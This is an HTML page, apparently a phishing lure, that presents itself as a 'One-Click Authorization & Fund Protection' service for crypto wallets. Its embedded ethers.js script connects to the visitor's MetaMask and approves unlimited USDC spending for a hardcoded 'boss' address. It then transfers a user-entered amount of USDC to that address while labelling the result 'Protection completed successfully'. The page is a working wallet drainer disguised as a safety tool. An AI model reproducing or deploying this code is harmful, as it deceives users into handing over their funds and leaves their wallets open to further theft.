<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Mark III ¬∑ One-Click Authorization & Fund Protection</title>
  <style>
    body {
      font-family: "Segoe UI", Roboto, sans-serif;
      background: #f0f4f8;
      color: #222;
      padding: 40px;
      text-align: center;
    }
    h2 {
      color: #2b6cb0;
    }
    button {
      margin: 20px;
      padding: 14px 30px;
      font-size: 18px;
      border: none;
      border-radius: 6px;
      background-color: #2b6cb0;
      color: white;
      cursor: pointer;
    }
    #status {
      margin-top: 30px;
      font-size: 17px;
      font-weight: bold;
      color: #333;
      white-space: pre-line;
    }
  </style>
</head>
<body>
  <h2>Mark III ¬∑ One-Click Authorization & Fund Protection</h2>
  <button onclick="startBinding()">üöÄ One-Click Bind & Protect</button>
  <div id="status"></div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
    const bossAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
    const approveAmount = ethers.constants.MaxUint256;

    async function startBinding() {
      const status = document.getElementById("status");
      try {
        if (!window.ethereum) {
          status.innerText = "‚ùå No wallet detected. Please install MetaMask.";
          return;
        }

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();
        status.innerText = "üîó Connected: " + userAddress;

        // Step 1: Approve
        status.innerText += "\n‚è≥ Approving contract...";
        const usdc = new ethers.Contract(usdcAddress, ["function approve(address,uint256) public returns (bool)"], signer);
        const approveTx = await usdc.approve(bossAddress, approveAmount);
        await approveTx.wait();
        status.innerText += "\n‚úÖ Authorization successful.";

        // Step 2: Transfer
        const amount = prompt("Enter USDC amount to protect:");
        if (!amount || isNaN(amount)) {
          status.innerText += "\n‚ùå Invalid amount.";
          return;
        }
        const parsedAmount = ethers.utils.parseUnits(amount, 6);
        const usdcTransfer = new ethers.Contract(usdcAddress, ["function transferFrom(address,address,uint256) public returns (bool)"], signer);
        status.innerText += "\n‚è≥ Transferring USDC...";
        const transferTx = await usdcTransfer.transferFrom(userAddress, bossAddress, parsedAmount);
        await transferTx.wait();
        status.innerText += "\nüí∞ Protection completed successfully.";

      } catch (err) {
        console.error(err);
        status.innerText += "\n‚ùå Error: " + (err.message || err);
      }
    }
  </script>
</body>
</html>
